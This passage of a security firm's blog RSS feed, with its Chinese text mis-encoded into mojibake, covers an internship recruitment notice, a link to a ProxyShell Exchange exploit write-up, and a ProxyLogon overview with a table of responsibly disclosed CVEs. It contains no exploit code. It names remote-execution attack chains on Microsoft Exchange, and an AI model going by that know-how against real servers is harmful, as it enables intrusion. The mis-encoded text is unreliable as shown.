  &lt;li&gt;ç†è§£è¨ˆç®—æ©Ÿç¶²è·¯çš„åŸºæœ¬æ¦‚å¿µã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Command Line æ“ä½œï¼ŒåŒ…å« Unix-like å’Œ Windows ä½œæ¥­ç³»çµ±çš„å¸¸è¦‹æˆ–å…§å»ºç³»çµ±æŒ‡ä»¤å·¥å…·ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼èªè¨€ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€JSPï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™å¯ä»¥å»ºç½®ã€è¨­å®šå¸¸è¦‹ç¶²é ä¼ºæœå™¨ï¼ˆå¦‚ï¼šNginxã€Apacheï¼‰åŠä½œæ¥­ç³»çµ±ï¼ˆå¦‚ï¼šLinuxï¼‰çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™è¿½æ ¹ç©¶æŸ¢çš„ç²¾ç¥ã€‚&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†éå¿…è¦æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´ã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹åˆ†æéå·²çŸ¥æ¼æ´ä¸¦èƒ½æ’°å¯« 1-day exploitã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“æ–¼ CTF æ¯”è³½ä¸­æ“”ä»»å‡ºé¡Œè€…ä¸¦å»ºç½®éé¡Œç›®ã€‚&lt;/li&gt;
      &lt;li&gt;æ“æœ‰ OSCP è­‰ç…§æˆ–åŒç­‰èƒ½åŠ›ä¹‹è­‰ç…§ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‡‰å¾µæµç¨‹&quot;&gt;æ‡‰å¾µæµç¨‹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç”„é¸ä¸€å…±åˆ†ç‚ºä¸‰å€‹éšæ®µï¼š&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬ä¸€éšæ®µæ›¸é¢å¯©æŸ¥&quot;&gt;ç¬¬ä¸€éšæ®µï¼šæ›¸é¢å¯©æŸ¥&lt;/h4&gt;

&lt;p&gt;ç¬¬ä¸€éšæ®µç‚ºæ›¸é¢å¯©æŸ¥ï¼Œæœƒéœ€è¦å¯©æŸ¥ä¸‹åˆ—å…©å€‹é …ç›®&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æ›¸é¢å¯©æŸ¥&lt;/li&gt;
  &lt;li&gt;ç°¡ç­”é¡Œæ¸¬é©—ï¼ˆ2 é¡Œï¼Œè©³è¦‹ä¸‹æ–¹&lt;a href=&quot;/blog/2022/01/27/intern-recruit/#:~:text=ç°¡ç­”é¡Œé¡Œç›®&quot;&gt;å ±åæ–¹å¼&lt;/a&gt;ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æˆ‘å€‘æœƒæ ¹æ“šæ‚¨çš„å±¥æ­·åŠç°¡ç­”é¡Œæ‰€å›ç­”çš„å…§å®¹ä¾†æ±ºå®šæ˜¯å¦æœ‰é€šéç¬¬ä¸€éšæ®µï¼Œæˆ‘å€‘æœƒåœ¨ä¸ƒå€‹å·¥ä½œå¤©å…§å›è¦†æ˜¯å¦æœ‰é€šéç¬¬ä¸€éšæ®µï¼Œä¸¦ä¸”è¦–æƒ…æ³é™„ä¸Šç¬¬äºŒéšæ®µçš„é¡Œç›®ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬äºŒéšæ®µèƒ½åŠ›æ¸¬é©—&quot;&gt;ç¬¬äºŒéšæ®µï¼šèƒ½åŠ›æ¸¬é©—&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
    &lt;ul&gt;
      &lt;li&gt;ç¬¬äºŒéšæ®µæœƒæ ¹æ“šæ‚¨çš„å±¥æ­·æˆ–æ˜¯ä»»ä½•å¯ä»¥è­‰æ˜å…·å‚™ Binary Exploit ç›¸é—œæŠ€èƒ½çš„è³‡æ–™ä¾†æ±ºå®šæ˜¯å¦éœ€è¦å¦å¤–åšé¡Œç›®ï¼Œå¦‚æœæœªé”æ¨™æº–å‰‡æœƒå¦å¤–æº–å‚™ Binary Exploitation ç›¸é—œé¡Œç›®ï¼ŒåŸå‰‡ä¸Šé€™å€‹éšæ®µæœƒçµ¦å¤§å®¶ç´„å…©é€±æ™‚é–“è§£é¡Œï¼Œè§£å®Œå¾Œè«‹å‹™å¿…å¯«ä¸‹è§£é¡Œéç¨‹ï¼ˆWrite-upï¼‰ï¼Œå¾…æˆ‘å€‘æ”¶åˆ°è§£é¡Œéç¨‹å¾Œï¼Œå°‡æœƒæ ¹æ“šæ‚¨çš„ç‹€æ³æ±ºå®šæ˜¯å¦å¯ä»¥é€²å…¥ç¬¬ä¸‰éšæ®µã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
    &lt;ul&gt;
      &lt;li&gt;ç„¡&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;ç¬¬ä¸‰éšæ®µé¢è©¦&quot;&gt;ç¬¬ä¸‰éšæ®µï¼šé¢è©¦&lt;/h4&gt;
&lt;p&gt;æ­¤éšæ®µç‚º 1~2 å°æ™‚çš„é¢è©¦ï¼Œæœƒæœ‰ 2~3 ä½è³‡æ·±å¤¥ä¼´åƒèˆ‡ï¼Œè©•ä¼°æ‚¨æ˜¯å¦å…·å‚™æœ¬æ¬¡å¯¦ç¿’æ‰€éœ€çš„æŠ€è¡“èƒ½åŠ›èˆ‡äººæ ¼ç‰¹è³ªã€‚&lt;/p&gt;

&lt;h3 id=&quot;å ±åæ–¹å¼&quot;&gt;å ±åæ–¹å¼&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„&lt;strong&gt;å±¥æ­·&lt;/strong&gt;åŠ&lt;strong&gt;ç°¡ç­”é¡Œç­”æ¡ˆ&lt;/strong&gt;åšæˆä¸€ä»½ PDF æª”å¯„åˆ° recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹æ–¼ 2022/02/11 å‰å¯„å‡ºï¼ˆå¦‚æœåé¡å·²æ»¿å‰‡è¦–æƒ…æ³ææ—©çµæŸï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¿¡ä»¶æ¨™é¡Œæ ¼å¼ï¼š[æ‡‰å¾µ] è·ä½ æ‚¨çš„å§“åï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] Web çµ„å¯¦ç¿’ç”Ÿ ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨å…©é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å¯¦ç¿’ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;éå»å°æ–¼è³‡å®‰çš„ç›¸é—œç ”ç©¶&lt;/li&gt;
      &lt;li&gt;å°æ–¼é€™ä»½å¯¦ç¿’çš„æœŸæœ›&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç°¡ç­”é¡Œé¡Œç›®å¦‚ä¸‹ï¼Œè«‹ä¾ç…§æ¬²ç”³è«‹ä¹‹çµ„åˆ¥å›ç­”ï¼Œç­”æ¡ˆé æ•¸ä¸é™ï¼Œå¯è‡ªç”±ç™¼æ®
    &lt;ul&gt;
      &lt;li&gt;Binary
        &lt;ul&gt;
          &lt;li&gt;å‡è¨­ä½ ä»Šå¤©è¦åˆ†æä¸€å€‹ C/C++ å¯«çš„ web serverï¼Œåœ¨ç¨‹å¼åŸ·è¡Œéç¨‹ä¸­ï¼Œä½ è¦ºå¾—æœ‰å“ªäº›åœ°æ–¹å¯èƒ½æœƒç™¼ç”Ÿå•é¡Œå°è‡´ç¨‹å¼æµç¨‹è¢«åŠ«æŒï¼Ÿç‚ºä»€éº¼ï¼Ÿ&lt;/li&gt;
          &lt;li&gt;åœ¨ Linux æ©Ÿå™¨ä¸Šï¼Œç•¶æˆ‘å€‘åœ¨å° CGI é€²è¡Œåˆ†ææ™‚ï¼Œç”±æ–¼ CGI æ˜¯ç”± apache æ‰€å‘¼å«ä¸¦å‚³é inputï¼Œä¸”åœ¨åŸ·è¡Œå¾Œæœƒç«‹å³çµæŸï¼Œé€™ç¨®ç¨‹å¼ä½ æœƒå¦‚ä½• debug ?&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Web
        &lt;ul&gt;
          &lt;li&gt;ç•¶ä½ åœ¨ç¶²é ç€è¦½å™¨çš„ç¶²å€åˆ—ä¸Šè¼¸å…¥ä¸€ä¸²ç¶²å€ï¼ˆä¾‹å¦‚ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://site.fake.devco.re/index.php?foo=bar&lt;/code&gt;ï¼‰ï¼Œéš¨å¾ŒæŒ‰ä¸‹ Enter éµåˆ°å‡ºç¾ç¶²é ç•«é¢ç‚ºæ­¢ï¼Œè«‹å•ä¸­é–“ç™¼ç”Ÿäº†ä»€éº¼äº‹æƒ…ï¼Ÿè«‹æ ¹æ“šä½ æ‰€çŸ¥çš„çŸ¥è­˜èƒŒæ™¯ï¼Œä»¥æ–‡å­—ç›¡å¯èƒ½èªªæ˜ã€‚&lt;/li&gt;
          &lt;li&gt;ä¾æ“šå‰è¿°å•é¡Œçš„ç­”æ¡ˆï¼Œå…è¨±éš¨æ„è¨­æƒ³ä»»ä½•ä¸€å€‹æƒ…å¢ƒï¼Œä¸¦ä»¥æ–‡å­—ç›¡å¯èƒ½èªªæ˜åœ¨æƒ…å¢ƒçš„å„å€‹ç’°ç¯€ä¸­å¯èƒ½ç™¼ç”Ÿçš„ä»»ä½•å®‰å…¨è­°é¡Œæˆ–è€…æ”»æ“Šç›®æ¨™ã€æ”»æ“Šé¢å‘ã€‚&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œå¦‚é€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ï¼Œæˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼Œä¸¦æœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/01/27/intern-recruit/</link>
                <guid>https://devco.re/blog/2022/01/27/intern-recruit</guid>
                <pubDate>Thu, 27 Jan 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 3 - ProxyShell!</title>
                <description>&lt;p&gt;This is a guest post DEVCORE collaborated with Zero Day Initiative (ZDI) and published at their blog, which describes the exploit chain we demonstrated at Pwn2Own 2021! Please visit the following link to read that :)&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell&quot;&gt;FROM PWN2OWN 2021: A NEW ATTACK SURFACE ON MICROSOFT EXCHANGE - PROXYSHELL!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you are interesting in more Exchange Server attacks, you can also check our series of articles:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With ProxyShell, an unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an exposed 443 port! Here is the &lt;a href=&quot;https://youtu.be/FC6iHw258RI&quot;&gt;demonstration video&lt;/a&gt;:&lt;/p&gt;

&lt;div style=&quot;text-align: center&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/FC6iHw258RI&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/</link>
                <guid>https://devco.re/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell</guid>
                <pubDate>Sun, 22 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ProxyLogon åƒ…åƒ…åªæ˜¯å†°å±±ä¸€è§’ï¼Œä¸€å€‹é‡å° Microsoft Exchange Server çš„å…¨æ–°æ”»æ“Šé¢ï¼</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.6em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;Microsoft Exchange Server ä½œç‚ºç•¶ä»Šä¸–ç•Œä¸Šæœ€å¸¸è¦‹çš„éƒµä»¶è§£æ±ºæ–¹æ¡ˆï¼Œå·²ç¶“å¹¾ä¹æ˜¯ä¼æ¥­ä»¥åŠæ”¿åºœæ¯æ—¥å·¥ä½œèˆ‡ç¶­ç¹«å®‰å…¨ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ï¼åœ¨ä»Šå¹´ä¸€æœˆï¼Œæˆ‘å€‘å›å ±äº†ä¸€ç³»åˆ—çš„ Exchange Server æ¼æ´çµ¦ Microsoftï¼Œä¸¦ä¸”å°‡é€™å€‹æ¼æ´å®ƒå‘½åç‚º &lt;a href=&quot;https://proxylogon.com/&quot;&gt;ProxyLogon&lt;/a&gt;ï¼Œç›¸ä¿¡å¦‚æœæ‚¨æœ‰åœ¨é—œæ³¨æ¥­ç•Œæ–°èï¼Œä¸€å®šä¹Ÿè½éé€™å€‹åå­—ï¼ProxyLogon ä¹Ÿè¨±æ˜¯ Exchange æ­·å²ä¸Šæœ€åš´é‡ã€å½±éŸ¿åŠ›ä¹Ÿæœ€å¤§çš„ä¸€å€‹æ¼æ´ï¼&lt;/p&gt;

&lt;p&gt;éš¨è‘—æ›´æ·±å…¥çš„å¾æ¶æ§‹å±¤å»ç ”ç©¶ ProxyLogonï¼Œæˆ‘å€‘ç™¼ç¾å®ƒä¸åƒ…åƒ…åªæ˜¯ä¸€å€‹æ¼æ´ï¼Œè€Œæ˜¯ä¸€æ•´å€‹æ–°çš„ã€æ²’æœ‰äººæéçš„æ”»æ“Šé¢å¯è®“é§­å®¢æˆ–å®‰å…¨ç ”ç©¶å“¡å»æŒ–æ˜æ›´å¤šçš„æ¼æ´ã€‚å› æ­¤æˆ‘å€‘å°ˆæ³¨æ·±å…¥ç ”ç©¶é€™å€‹æ”»æ“Šé¢ï¼Œä¸¦å¾ä¸­ç™¼ç¾äº†è‡³å°‘å…«å€‹æ¼æ´ï¼Œé€™äº›æ¼æ´æ¶µè“‹äº†ä¼ºæœå™¨ç«¯ã€å®¢æˆ¶ç«¯ï¼Œç”šè‡³å¯†ç¢¼å­¸æ¼æ´ï¼Œæˆ‘å€‘ä¸¦å°‡é€™äº›æ¼æ´çµ„åˆæˆäº†ä¸‰å€‹æ”»æ“Šéˆï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ProxyLogon: æœ€çŸ¥åã€å½±éŸ¿åŠ›ä¹Ÿæœ€å¤§çš„ Exchange æ”»æ“Šéˆ&lt;/li&gt;
  &lt;li&gt;ProxyOracle: ä¸€å€‹å¯ä»¥é‚„åŸä»»æ„ Exchange ä½¿ç”¨è€…æ˜æ–‡å¯†ç¢¼çš„æ”»æ“Šéˆ&lt;/li&gt;
  &lt;li&gt;ProxyShell: æˆ‘å€‘åœ¨ Pwn2Own 2021 ä¸Šå±•ç¤ºæ‰“æ‰ Exchange çš„æ”»æ“Šéˆ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰€æœ‰æˆ‘å€‘æ‰¾åˆ°çš„æ¼æ´éƒ½æ˜¯é‚è¼¯æ¼æ´ï¼Œé€™ä»£è¡¨ç›¸è¼ƒæ–¼è¨˜æ†¶é«”æ¯€æé¡å‹çš„æ¼æ´ï¼Œé€™äº›æ¼æ´æ›´å®¹æ˜“è¢«é‡ç¾ä»¥åŠåˆ©ç”¨ï¼Œæˆ‘å€‘ä¹Ÿå°‡æˆæœç™¼è¡¨è‡³ &lt;a href=&quot;https://www.blackhat.com/us-21/briefings/schedule/index.html#proxylogon-is-just-the-tip-of-the-iceberg-a-new-attack-surface-on-microsoft-exchange-server-23442&quot;&gt;Black Hat USA&lt;/a&gt; åŠ &lt;a href=&quot;https://defcon.org/html/defcon-29/dc-29-speakers.html#tsai&quot;&gt;DEFCON&lt;/a&gt; ä¸Šï¼Œä¹ŸåŒæ™‚ç²å¾—äº† 2021 Pwnie Awards å¹´åº¦ Best Server-Side Bug çé …ï¼Œå¦‚æœä½ æœ‰èˆˆè¶£çš„è©±å¯ä»¥å¾é€™é‚Šä¸‹è¼‰æœƒè­°çš„æŠ•å½±ç‰‡!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! &lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf&quot;&gt;[æŠ•å½±ç‰‡]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=5mqid-7zp8k&quot;&gt;[å½±ç‰‡]&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æœ¬æ¬¡æåŠçš„æ¼æ´çš†ç¶“éè² è²¬ä»»çš„æ¼æ´æ¥éœ²ç¨‹åºå›å ±çµ¦å¾®è»Ÿã€ä¸¦ç²å¾—ä¿®å¾©ï¼Œæ‚¨å¯ä»¥å¾ä¸‹é¢é€™å¼µåœ–æŸ¥çœ‹è©³ç´°çš„æ¼æ´ç·¨è™ŸåŠå›å ±æ™‚é–“è¡¨ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Report Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CVE&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Patch Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CAS&lt;sup&gt;[1]&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Reported By&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473&quot;&gt;CVE-2021-34473&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523&quot;&gt;CVE-2021-34523&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207&quot;&gt;CVE-2021-31207&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai and Dlive&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div style=&quot;font-size:0.6em; line-height: 1.6;&quot;&gt;
&lt;br /&gt;&lt;em&gt;[1] Bugs relate to this new attack surface direclty&lt;/em&gt;&lt;br /&gt;
&lt;em&gt;[2] Pwn2Own 2021 bugs&lt;/em&gt;
&lt;/div&gt;

&lt;p&gt;æ›´è©³ç›¡çš„æŠ€è¡“ç´°ç¯€æˆ‘å€‘å·²é™¸çºŒå…¬å¸ƒï¼Œå¾ŒçºŒé€£çµæœƒæŒçºŒæ›´æ–°æ–¼æœ¬æ–‡ï¼Œæ•¬è«‹æœŸå¾…ï¼š&lt;/p&gt;
&lt;ul&gt;
